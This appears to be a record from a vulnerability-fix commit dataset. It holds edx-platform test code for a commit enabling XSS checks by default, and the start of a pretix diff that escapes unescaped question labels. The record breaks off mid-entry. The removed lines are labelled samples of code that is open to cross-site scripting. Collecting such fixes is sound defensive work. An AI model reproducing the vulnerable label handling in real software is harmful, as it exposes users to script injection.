self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n\n    def test_verify_xss_env_var(self):\n        self.env_var_override.set('VERIFY_XSS', 'True')\n        with self.env_var_override:\n            suite = BokChoyTestSuite('')\n            name = 'tests'\n            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n\n    def test_test_dir(self):\n        test_dir = 'foo'\n        suite = BokChoyTestSuite('', test_dir=test_dir)\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=test_dir)\n        )\n\n    def test_verbosity_settings_1_process(self):\n        \"\"\"\n        Using 1 process means paver should ask for the traditional xunit plugin for plugin results\n        \"\"\"\n        expected_verbosity_string = (\n            \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else ''\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=1)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_verbosity_settings_2_processes(self):\n        \"\"\"\n        Using multiple processes means specific xunit, coloring, and process-related settings should\n        be used.\n        \"\"\"\n        process_count = 2\n        expected_verbosity_string = (\n            \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\"\n            \" --processes={procs} --no-color --process-timeout=1200\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else '',\n                procs=process_count\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=process_count)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_verbosity_settings_3_processes(self):\n        \"\"\"\n        With the above test, validate that num_processes can be set to various values\n        \"\"\"\n        process_count = 3\n        expected_verbosity_string = (\n            \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\"\n            \" --processes={procs} --no-color --process-timeout=1200\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else '',\n                procs=process_count\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=process_count)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_invalid_verbosity_and_processes(self):\n        \"\"\"\n        If an invalid combination of verbosity and number of processors is passed in, a\n        BuildFailure should be raised\n        \"\"\"\n        suite = BokChoyTestSuite('', num_processes=2, verbosity=3)\n        with self.assertRaises(BuildFailure):\n            BokChoyTestSuite.verbosity_processes_string(suite)\n\n\nclass TestPaverPa11yCrawlerCmd(unittest.TestCase):\n\n    \"\"\"\n    Paver pa11ycrawler command test cases.  Most of the functionality is\n    inherited from BokChoyTestSuite, so those tests aren't duplicated.\n    \"\"\"\n\n    def setUp(self):\n        super(TestPaverPa11yCrawlerCmd, self).setUp()\n\n        # Mock shell commands\n        mock_sh = patch('pavelib.utils.test.suites.bokchoy_suite.sh')\n        self._mock_sh = mock_sh.start()\n\n        # Cleanup mocks\n        self.addCleanup(mock_sh.stop)\n\n    def _expected_command(self, report_dir, start_urls):\n        \"\"\"\n        Returns the expected command to run pa11ycrawler.\n        \"\"\"\n        expected_statement = (\n            'pa11ycrawler run {start_urls} '\n            '--pa11ycrawler-allowed-domains=localhost '\n            '--pa11ycrawler-reports-dir={report_dir} '\n            '--pa11ycrawler-deny-url-matcher=logout '\n            '--pa11y-reporter=\"1.0-json\" '\n            '--depth-limit=6 '\n        ).format(\n            start_urls=' '.join(start_urls),\n            report_dir=report_dir,\n        )\n        return expected_statement\n\n    def test_default(self):\n        suite = Pa11yCrawler('')\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(suite.pa11y_report_dir, suite.start_urls)\n        )\n\n    def test_get_test_course(self):\n        suite = Pa11yCrawler('')\n        suite.get_test_course()\n        self._mock_sh.assert_has_calls([\n            call(\n                'wget {targz} -O {dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)),\n            call(\n                'tar zxf {dir}demo_course.tar.gz -C {dir}'.format(dir=suite.imports_dir)),\n        ])\n\n    def test_generate_html_reports(self):\n        suite = Pa11yCrawler('')\n        suite.generate_html_reports()\n        self._mock_sh.assert_has_calls([\n            call(\n                'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite.pa11y_report_dir)),\n        ])\n"}, "/pavelib/utils/test/suites/bokchoy_suite.py": {"changes": [{"diff": "\n         self.default_store = kwargs.get('default_store', None)\n         self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)\n         self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)\n-        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))\n+        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', True))\n         self.extra_args = kwargs.get('extra_args', '')\n         self.har_dir = self.log_dir / 'hars'\n         self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE\n", "add": 1, "remove": 1, "filename": "/pavelib/utils/test/suites/bokchoy_suite.py", "badparts": ["        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))"], "goodparts": ["        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', True))"]}], "source": "\n\"\"\" Class used for defining and running Bok Choy acceptance test suite \"\"\" from time import sleep from urllib import urlencode from common.test.acceptance.fixtures.course import CourseFixture, FixtureError from path import Path as path from paver.easy import sh, BuildFailure from pavelib.utils.test.suites.suite import TestSuite from pavelib.utils.envs import Env from pavelib.utils.test import bokchoy_utils from pavelib.utils.test import utils as test_utils import os try: from pygments.console import colorize except ImportError: colorize=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"\"\" TestSuite for running Bok Choy tests Properties(below is a subset): test_dir -parent directory for tests log_dir -directory for test output report_dir -directory for reports(e.g., coverage) related to test execution xunit_report -directory for xunit-style output(xml) fasttest -when set, skip various set-up tasks(e.g., collectstatic) serversonly -prepare and run the necessary servers, only stopping when interrupted with Ctrl-C testsonly -assume servers are running(as per above) and run tests with no setup or cleaning of environment test_spec -when set, specifies test files, classes, cases, etc. See platform doc. default_store -modulestore to use when running tests(split or draft) num_processes -number of processes or threads to use in tests. Recommendation is that this is less than or equal to the number of available processors. verify_xss -when set, check for XSS vulnerabilities in the page HTML. See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html \"\"\" def __init__(self, *args, **kwargs): super(BokChoyTestSuite, self).__init__(*args, **kwargs) self.test_dir=Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests') self.log_dir=Env.BOK_CHOY_LOG_DIR self.report_dir=kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR) self.xunit_report=self.report_dir / \"xunit.xml\" self.cache=Env.BOK_CHOY_CACHE self.fasttest=kwargs.get('fasttest', False) self.serversonly=kwargs.get('serversonly', False) self.testsonly=kwargs.get('testsonly', False) self.test_spec=kwargs.get('test_spec', None) self.default_store=kwargs.get('default_store', None) self.verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY) self.num_processes=kwargs.get('num_processes', DEFAULT_NUM_PROCESSES) self.verify_xss=kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False)) self.extra_args=kwargs.get('extra_args', '') self.har_dir=self.log_dir / 'hars' self.a11y_file=Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE self.imports_dir=kwargs.get('imports_dir', None) self.coveragerc=kwargs.get('coveragerc', None) self.save_screenshots=kwargs.get('save_screenshots', False) def __enter__(self): super(BokChoyTestSuite, self).__enter__() self.log_dir.makedirs_p() self.har_dir.makedirs_p() self.report_dir.makedirs_p() test_utils.clean_reports_dir() if not(self.fasttest or self.skip_clean or self.testsonly): test_utils.clean_test_files() msg=colorize('green', \"Checking for mongo, memchache, and mysql...\") print msg bokchoy_utils.check_services() if not self.testsonly: self.prepare_bokchoy_run() else: self.load_data() msg=colorize('green', \"Confirming servers have started...\") print msg bokchoy_utils.wait_for_test_servers() try: CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install() print 'Forums permissions/roles data has been seeded' except FixtureError: pass if self.serversonly: self.run_servers_continuously() def __exit__(self, exc_type, exc_value, traceback): super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback) if self.testsonly: msg=colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.') print msg else: msg=colorize('green', \"Cleaning up databases...\") print msg sh(\"./manage.py lms --settings bok_choy flush --traceback --noinput\") bokchoy_utils.clear_mongo() def verbosity_processes_string(self): \"\"\" Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct the proper combination for use with nosetests. \"\"\" substring=[] if self.verbosity !=DEFAULT_VERBOSITY and self.num_processes !=DEFAULT_NUM_PROCESSES: msg='Cannot pass in both num_processors and verbosity. Quitting' raise BuildFailure(msg) if self.num_processes !=1: substring=[ \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report), \"--processes={}\".format(self.num_processes), \"--no-color --process-timeout=1200\" ] else: substring=[ \"--with-xunit\", \"--xunit-file={}\".format(self.xunit_report), \"--verbosity={}\".format(self.verbosity), ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok Choy run. If --fasttest is not specified then static assets are collected \"\"\" sh(\"{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT)) if not self.fasttest: self.generate_optimized_static_assets() bokchoy_utils.clear_mongo() self.cache.flush_all() self.load_data() self.load_courses() msg=colorize('green', \"Confirming servers are running...\") print msg bokchoy_utils.start_servers(self.default_store, self.coveragerc) def load_courses(self): \"\"\" Loads courses from self.imports_dir. Note: self.imports_dir is the directory that contains the directories that have courses in them. For example, if the course is located in `test_root/courses/test-example-course/`, self.imports_dir should be `test_root/courses/`. \"\"\" msg=colorize('green', \"Importing courses from{}...\".format(self.imports_dir)) print msg if self.imports_dir: sh( \"DEFAULT_STORE={default_store}\" \"./manage.py cms --settings=bok_choy import{import_dir}\".format( default_store=self.default_store, import_dir=self.imports_dir ) ) def load_data(self): \"\"\" Loads data into database from db_fixtures \"\"\" print 'Loading data from json fixtures in db_fixtures directory' sh( \"DEFAULT_STORE={default_store}\" \"./manage.py lms --settings bok_choy loaddata --traceback\" \" common/test/db_fixtures/*.json\".format( default_store=self.default_store, ) ) def run_servers_continuously(self): \"\"\" Infinite loop. Servers will continue to run in the current session unless interrupted. \"\"\" print 'Bok-choy servers running. Press Ctrl-C to exit...\\n' print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok-choy servers.\\n\" break @property def cmd(self): \"\"\" This method composes the nosetests command to send to the terminal. If nosetests aren't being run, the command returns an empty string. \"\"\" if not self.test_spec: test_spec=self.test_dir else: test_spec=self.test_dir / self.test_spec if self.serversonly: return \"\" cmd=[ \"DEFAULT_STORE={}\".format(self.default_store), \"SCREENSHOT_DIR='{}'\".format(self.log_dir), \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir), \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file), \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir), \"VERIFY_XSS='{}'\".format(self.verify_xss), \"nosetests\", test_spec, \"{}\".format(self.verbosity_processes_string()) ] if self.pdb: cmd.append(\"--pdb\") if self.save_screenshots: cmd.append(\"--with-save-baseline\") cmd.append(self.extra_args) cmd=(\" \").join(cmd) return cmd class Pa11yCrawler(BokChoyTestSuite): \"\"\" Sets up test environment with mega-course loaded, and runs pa11ycralwer against it. \"\"\" def __init__(self, *args, **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir: self.should_fetch_course=False else: self.should_fetch_course=kwargs.get('should_fetch_course') self.imports_dir=path('test_root/courses/') self.pa11y_report_dir=os.path.join(self.report_dir, 'pa11ycrawler_reports') self.tar_gz_file=\"https://github.com/edx/demo-test-course/archive/master.tar.gz\" self.start_urls=[] auto_auth_params={ \"redirect\": 'true', \"staff\": 'true', \"course_id\": self.course_key, } cms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params)) sequence_url=\"/api/courses/v1/blocks/?{}\".format( urlencode({ \"course_id\": self.course_key, \"depth\": \"all\", \"all_blocks\": \"true\", }) ) auto_auth_params.update({'redirect_to': sequence_url}) lms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params)) def __enter__(self): if self.should_fetch_course: self.get_test_course() super(Pa11yCrawler, self).__enter__() def get_test_course(self): \"\"\" Fetches the test course. \"\"\" self.imports_dir.makedirs_p() zipped_course=self.imports_dir +'demo_course.tar.gz' msg=colorize('green', \"Fetching the test course from github...\") print msg sh( 'wget{tar_gz_file} -O{zipped_course}'.format( tar_gz_file=self.tar_gz_file, zipped_course=zipped_course, ) ) msg=colorize('green', \"Uncompressing the test course...\") print msg sh( 'tar zxf{zipped_course} -C{courses_dir}'.format( zipped_course=zipped_course, courses_dir=self.imports_dir, ) ) def generate_html_reports(self): \"\"\" Runs pa11ycrawler json-to-html \"\"\" cmd_str=( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}' ).format(report_dir=self.pa11y_report_dir) sh(cmd_str) @property def cmd(self): \"\"\" Runs pa11ycrawler as staff user against the test course. \"\"\" cmd_str=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains={allowed_domains} ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher={dont_go_here} ' '--pa11y-reporter=\"{reporter}\" ' '--depth-limit={depth} ' ).format( start_urls=' '.join(self.start_urls), allowed_domains='localhost', report_dir=self.pa11y_report_dir, reporter=\"1.0-json\", dont_go_here=\"logout\", depth=\"6\", ) return cmd_str ", "sourceWithComments": "\"\"\"\nClass used for defining and running Bok Choy acceptance test suite\n\"\"\"\nfrom time import sleep\nfrom urllib import urlencode\n\nfrom common.test.acceptance.fixtures.course import CourseFixture, FixtureError\n\nfrom path import Path as path\nfrom paver.easy import sh, BuildFailure\nfrom pavelib.utils.test.suites.suite import TestSuite\nfrom pavelib.utils.envs import Env\nfrom pavelib.utils.test import bokchoy_utils\nfrom pavelib.utils.test import utils as test_utils\n\nimport os\n\ntry:\n    from pygments.console import colorize\nexcept ImportError:\n    colorize = lambda color, text: text\n\n__test__ = False  # do not collect\n\nDEFAULT_NUM_PROCESSES = 1\nDEFAULT_VERBOSITY = 2\n\n\nclass BokChoyTestSuite(TestSuite):\n    \"\"\"\n    TestSuite for running Bok Choy tests\n    Properties (below is a subset):\n      test_dir - parent directory for tests\n      log_dir - directory for test output\n      report_dir - directory for reports (e.g., coverage) related to test execution\n      xunit_report - directory for xunit-style output (xml)\n      fasttest - when set, skip various set-up tasks (e.g., collectstatic)\n      serversonly - prepare and run the necessary servers, only stopping when interrupted with Ctrl-C\n      testsonly - assume servers are running (as per above) and run tests with no setup or cleaning of environment\n      test_spec - when set, specifies test files, classes, cases, etc. See platform doc.\n      default_store - modulestore to use when running tests (split or draft)\n      num_processes - number of processes or threads to use in tests. Recommendation is that this\n      is less than or equal to the number of available processors.\n      verify_xss - when set, check for XSS vulnerabilities in the page HTML.\n      See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html\n    \"\"\"\n    def __init__(self, *args, **kwargs):\n        super(BokChoyTestSuite, self).__init__(*args, **kwargs)\n        self.test_dir = Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests')\n        self.log_dir = Env.BOK_CHOY_LOG_DIR\n        self.report_dir = kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR)\n        self.xunit_report = self.report_dir / \"xunit.xml\"\n        self.cache = Env.BOK_CHOY_CACHE\n        self.fasttest = kwargs.get('fasttest', False)\n        self.serversonly = kwargs.get('serversonly', False)\n        self.testsonly = kwargs.get('testsonly', False)\n        self.test_spec = kwargs.get('test_spec', None)\n        self.default_store = kwargs.get('default_store', None)\n        self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)\n        self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)\n        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))\n        self.extra_args = kwargs.get('extra_args', '')\n        self.har_dir = self.log_dir / 'hars'\n        self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE\n        self.imports_dir = kwargs.get('imports_dir', None)\n        self.coveragerc = kwargs.get('coveragerc', None)\n        self.save_screenshots = kwargs.get('save_screenshots', False)\n\n    def __enter__(self):\n        super(BokChoyTestSuite, self).__enter__()\n\n        # Ensure that we have a directory to put logs and reports\n        self.log_dir.makedirs_p()\n        self.har_dir.makedirs_p()\n        self.report_dir.makedirs_p()\n        test_utils.clean_reports_dir()      # pylint: disable=no-value-for-parameter\n\n        if not (self.fasttest or self.skip_clean or self.testsonly):\n            test_utils.clean_test_files()\n\n        msg = colorize('green', \"Checking for mongo, memchache, and mysql...\")\n        print msg\n        bokchoy_utils.check_services()\n\n        if not self.testsonly:\n            self.prepare_bokchoy_run()\n        else:\n            # load data in db_fixtures\n            self.load_data()\n\n        msg = colorize('green', \"Confirming servers have started...\")\n        print msg\n        bokchoy_utils.wait_for_test_servers()\n        try:\n            # Create course in order to seed forum data underneath. This is\n            # a workaround for a race condition. The first time a course is created;\n            # role permissions are set up for forums.\n            CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install()\n            print 'Forums permissions/roles data has been seeded'\n        except FixtureError:\n            # this means it's already been done\n            pass\n\n        if self.serversonly:\n            self.run_servers_continuously()\n\n    def __exit__(self, exc_type, exc_value, traceback):\n        super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback)\n\n        # Using testsonly will leave all fixtures in place (Note: the db will also be dirtier.)\n        if self.testsonly:\n            msg = colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.')\n            print msg\n        else:\n            # Clean up data we created in the databases\n            msg = colorize('green', \"Cleaning up databases...\")\n            print msg\n            sh(\"./manage.py lms --settings bok_choy flush --traceback --noinput\")\n            bokchoy_utils.clear_mongo()\n\n    def verbosity_processes_string(self):\n        \"\"\"\n        Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct\n        the proper combination for use with nosetests.\n        \"\"\"\n        substring = []\n\n        if self.verbosity != DEFAULT_VERBOSITY and self.num_processes != DEFAULT_NUM_PROCESSES:\n            msg = 'Cannot pass in both num_processors and verbosity. Quitting'\n            raise BuildFailure(msg)\n\n        if self.num_processes != 1:\n            # Construct \"multiprocess\" nosetest substring\n            substring = [\n                \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report),\n                \"--processes={}\".format(self.num_processes),\n                \"--no-color --process-timeout=1200\"\n            ]\n\n        else:\n            substring = [\n                \"--with-xunit\",\n                \"--xunit-file={}\".format(self.xunit_report),\n                \"--verbosity={}\".format(self.verbosity),\n            ]\n\n        return \" \".join(substring)\n\n    def prepare_bokchoy_run(self):\n        \"\"\"\n        Sets up and starts servers for a Bok Choy run. If --fasttest is not\n        specified then static assets are collected\n        \"\"\"\n        sh(\"{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT))\n\n        if not self.fasttest:\n            self.generate_optimized_static_assets()\n\n        # Clear any test data already in Mongo or MySQLand invalidate\n        # the cache\n        bokchoy_utils.clear_mongo()\n        self.cache.flush_all()\n\n        # load data in db_fixtures\n        self.load_data()\n\n        # load courses if self.imports_dir is set\n        self.load_courses()\n\n        # Ensure the test servers are available\n        msg = colorize('green', \"Confirming servers are running...\")\n        print msg\n        bokchoy_utils.start_servers(self.default_store, self.coveragerc)\n\n    def load_courses(self):\n        \"\"\"\n        Loads courses from self.imports_dir.\n\n        Note: self.imports_dir is the directory that contains the directories\n        that have courses in them. For example, if the course is located in\n        `test_root/courses/test-example-course/`, self.imports_dir should be\n        `test_root/courses/`.\n        \"\"\"\n        msg = colorize('green', \"Importing courses from {}...\".format(self.imports_dir))\n        print msg\n\n        if self.imports_dir:\n            sh(\n                \"DEFAULT_STORE={default_store}\"\n                \" ./manage.py cms --settings=bok_choy import {import_dir}\".format(\n                    default_store=self.default_store,\n                    import_dir=self.imports_dir\n                )\n            )\n\n    def load_data(self):\n        \"\"\"\n        Loads data into database from db_fixtures\n        \"\"\"\n        print 'Loading data from json fixtures in db_fixtures directory'\n        sh(\n            \"DEFAULT_STORE={default_store}\"\n            \" ./manage.py lms --settings bok_choy loaddata --traceback\"\n            \" common/test/db_fixtures/*.json\".format(\n                default_store=self.default_store,\n            )\n        )\n\n    def run_servers_continuously(self):\n        \"\"\"\n        Infinite loop. Servers will continue to run in the current session unless interrupted.\n        \"\"\"\n        print 'Bok-choy servers running. Press Ctrl-C to exit...\\n'\n        print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n'\n\n        while True:\n            try:\n                sleep(10000)\n            except KeyboardInterrupt:\n                print \"Stopping bok-choy servers.\\n\"\n                break\n\n    @property\n    def cmd(self):\n        \"\"\"\n        This method composes the nosetests command to send to the terminal. If nosetests aren't being run,\n         the command returns an empty string.\n        \"\"\"\n        # Default to running all tests if no specific test is specified\n        if not self.test_spec:\n            test_spec = self.test_dir\n        else:\n            test_spec = self.test_dir / self.test_spec\n\n        # Skip any additional commands (such as nosetests) if running in\n        # servers only mode\n        if self.serversonly:\n            return \"\"\n\n        # Construct the nosetests command, specifying where to save\n        # screenshots and XUnit XML reports\n        cmd = [\n            \"DEFAULT_STORE={}\".format(self.default_store),\n            \"SCREENSHOT_DIR='{}'\".format(self.log_dir),\n            \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir),\n            \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file),\n            \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir),\n            \"VERIFY_XSS='{}'\".format(self.verify_xss),\n            \"nosetests\",\n            test_spec,\n            \"{}\".format(self.verbosity_processes_string())\n        ]\n        if self.pdb:\n            cmd.append(\"--pdb\")\n        if self.save_screenshots:\n            cmd.append(\"--with-save-baseline\")\n        cmd.append(self.extra_args)\n\n        cmd = (\" \").join(cmd)\n        return cmd\n\n\nclass Pa11yCrawler(BokChoyTestSuite):\n    \"\"\"\n    Sets up test environment with mega-course loaded, and runs pa11ycralwer\n    against it.\n    \"\"\"\n\n    def __init__(self, *args, **kwargs):\n        super(Pa11yCrawler, self).__init__(*args, **kwargs)\n        self.course_key = kwargs.get('course_key')\n        if self.imports_dir:\n            # If imports_dir has been specified, assume the files are\n            # already there -- no need to fetch them from github. This\n            # allows someome to crawl a different course. They are responsible\n            # for putting it, un-archived, in the directory.\n            self.should_fetch_course = False\n        else:\n            # Otherwise, obey `--skip-fetch` command and use the default\n            # test course.  Note that the fetch will also be skipped when\n            # using `--fast`.\n            self.should_fetch_course = kwargs.get('should_fetch_course')\n            self.imports_dir = path('test_root/courses/')\n\n        self.pa11y_report_dir = os.path.join(self.report_dir, 'pa11ycrawler_reports')\n        self.tar_gz_file = \"https://github.com/edx/demo-test-course/archive/master.tar.gz\"\n\n        self.start_urls = []\n        auto_auth_params = {\n            \"redirect\": 'true',\n            \"staff\": 'true',\n            \"course_id\": self.course_key,\n        }\n        cms_params = urlencode(auto_auth_params)\n        self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params))\n\n        sequence_url = \"/api/courses/v1/blocks/?{}\".format(\n            urlencode({\n                \"course_id\": self.course_key,\n                \"depth\": \"all\",\n                \"all_blocks\": \"true\",\n            })\n        )\n        auto_auth_params.update({'redirect_to': sequence_url})\n        lms_params = urlencode(auto_auth_params)\n        self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params))\n\n    def __enter__(self):\n        if self.should_fetch_course:\n            self.get_test_course()\n        super(Pa11yCrawler, self).__enter__()\n\n    def get_test_course(self):\n        \"\"\"\n        Fetches the test course.\n        \"\"\"\n        self.imports_dir.makedirs_p()\n        zipped_course = self.imports_dir + 'demo_course.tar.gz'\n\n        msg = colorize('green', \"Fetching the test course from github...\")\n        print msg\n\n        sh(\n            'wget {tar_gz_file} -O {zipped_course}'.format(\n                tar_gz_file=self.tar_gz_file,\n                zipped_course=zipped_course,\n            )\n        )\n\n        msg = colorize('green', \"Uncompressing the test course...\")\n        print msg\n\n        sh(\n            'tar zxf {zipped_course} -C {courses_dir}'.format(\n                zipped_course=zipped_course,\n                courses_dir=self.imports_dir,\n            )\n        )\n\n    def generate_html_reports(self):\n        \"\"\"\n        Runs pa11ycrawler json-to-html\n        \"\"\"\n        cmd_str = (\n            'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}'\n        ).format(report_dir=self.pa11y_report_dir)\n\n        sh(cmd_str)\n\n    @property\n    def cmd(self):\n        \"\"\"\n        Runs pa11ycrawler as staff user against the test course.\n        \"\"\"\n        cmd_str = (\n            'pa11ycrawler run {start_urls} '\n            '--pa11ycrawler-allowed-domains={allowed_domains} '\n            '--pa11ycrawler-reports-dir={report_dir} '\n            '--pa11ycrawler-deny-url-matcher={dont_go_here} '\n            '--pa11y-reporter=\"{reporter}\" '\n            '--depth-limit={depth} '\n        ).format(\n            start_urls=' '.join(self.start_urls),\n            allowed_domains='localhost',\n            report_dir=self.pa11y_report_dir,\n            reporter=\"1.0-json\",\n            dont_go_here=\"logout\",\n            depth=\"6\",\n        )\n        return cmd_str\n"}}, "msg": "Enable VERIFY_XSS checking by default."}}, "https://github.com/pretix/pretix": {"affc6254a8316643d4afe9e8b7f8cd288c86ca1f": {"url": "https://api.github.com/repos/pretix/pretix/commits/affc6254a8316643d4afe9e8b7f8cd288c86ca1f", "html_url": "https://github.com/pretix/pretix/commit/affc6254a8316643d4afe9e8b7f8cd288c86ca1f", "sha": "affc6254a8316643d4afe9e8b7f8cd288c86ca1f", "keyword": "XSS fix", "diff": "diff --git a/src/pretix/base/forms/questions.py b/src/pretix/base/forms/questions.py\nindex 5023f61d2..d8b3ef4c2 100644\n--- a/src/pretix/base/forms/questions.py\n+++ b/src/pretix/base/forms/questions.py\n@@ -9,6 +9,7 @@\n from django import forms\n from django.contrib import messages\n from django.core.exceptions import ValidationError\n+from django.utils.html import escape\n from django.utils.safestring import mark_safe\n from django.utils.translation import ugettext_lazy as _\n \n@@ -171,6 +172,7 @@ def __init__(self, *args, **kwargs):\n                 initial = None\n             tz = pytz.timezone(event.settings.timezone)\n             help_text = rich_text(q.help_text)\n+            label = escape(q.question)  # django-bootstrap3 calls mark_safe\n             if q.type == Question.TYPE_BOOLEAN:\n                 if q.required:\n                     # For some reason, django-bootstrap3 does not set the required attribute\n@@ -185,26 +187,26 @@ def __init__(self, *args, **kwargs):\n                     initialbool = False\n \n                 field = forms.BooleanField(\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     initial=initialbool, widget=widget,\n                 )\n             elif q.type == Question.TYPE_NUMBER:\n                 field = forms.DecimalField(\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=q.help_text,\n                     initial=initial.answer if initial else None,\n                     min_value=Decimal('0.00'),\n                 )\n             elif q.type == Question.TYPE_STRING:\n                 field = forms.CharField(\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     initial=initial.answer if initial else None,\n                 )\n             elif q.type == Question.TYPE_TEXT:\n                 field = forms.CharField(\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     widget=forms.Textarea,\n                     initial=initial.answer if initial else None,\n@@ -212,7 +214,7 @@ def __init__(self, *args, **kwargs):\n             elif q.type == Question.TYPE_CHOICE:\n                 field = forms.ModelChoiceField(\n                     queryset=q.options,\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     widget=forms.Select,\n                     empty_label='',\n@@ -221,35 +223,35 @@ def __init__(self, *args, **kwargs):\n             elif q.type == Question.TYPE_CHOICE_MULTIPLE:\n                 field = forms.ModelMultipleChoiceField(\n                     queryset=q.options,\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     widget=forms.CheckboxSelectMultiple,\n                     initial=initial.options.all() if initial else None,\n                 )\n             elif q.type == Question.TYPE_FILE:\n                 field = forms.FileField(\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     initial=initial.file if initial else None,\n                     widget=UploadedFileWidget(position=pos, event=event, answer=initial),\n                 )\n             elif q.type == Question.TYPE_DATE:\n                 field = forms.DateField(\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     initial=dateutil.parser.parse(initial.answer).date() if initial and initial.answer else None,\n                     widget=DatePickerWidget(),\n                 )\n             elif q.type == Question.TYPE_TIME:\n                 field = forms.TimeField(\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     initial=dateutil.parser.parse(initial.answer).time() if initial and initial.answer else None,\n                     widget=TimePickerWidget(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')),\n                 )\n             elif q.type == Question.TYPE_DATETIME:\n                 field = SplitDateTimeField(\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     initial=dateutil.parser.parse(initial.answer).astimezone(tz) if initial and initial.answer else None,\n                     widget=SplitDateTimePickerWidget(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')),\n", "message": "", "files": 